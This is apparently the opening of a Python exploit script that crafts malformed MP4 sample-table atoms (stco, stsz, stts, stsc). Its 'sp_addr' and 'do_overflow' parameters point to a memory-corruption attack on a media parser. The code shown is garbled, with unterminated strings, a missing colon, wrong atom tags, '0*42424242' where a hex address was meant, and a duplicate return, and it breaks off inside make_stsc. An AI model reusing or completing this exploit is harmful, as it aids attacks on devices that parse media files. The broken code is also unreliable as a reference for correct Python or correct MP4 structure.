#!/usr/bin/env python
import struct
import socket

def make_chunk(tag, data):
    if len(tag)!=4
        raise 'yo! They call it "fourCC" for a reason.'
    ret = struct.pack('>L',len(data)+8)
    ret += tag
    ret += data
    return ret

def make_stco(extra="):
    ret = struct.pack('>L',0)
    ret +=struct.pack('>L',0)
    ret +=struct.pack('>L',0)
    return make_chunk('stcz',ret+extra)
              
def make_stsz(extra="):
    ret = struct.pack('>L',0)
    ret +=struct.pack('>L',0)
    ret +=struct.pack('>L',0)
    return make_chunk('stcz',ret+extra)
              
def make_stts():
    ret = struct.pack('>L',0)
    ret +=struct.pack('>L',0)
    return make_chunk('stts',ret)

def make_stsc_entry(start,per,desc):
    ret ="
    ret += struct.pack('>L',start + 1)
    ret +=struct.pack('>L',per)
    return make_chunk('stts',desc)
    return ret

def make_stsc(num_alloc,num_write,sp_addr=0*42424242,do_overflow = False):
    ret = struct.pack('>L',0)
#this is the clean version
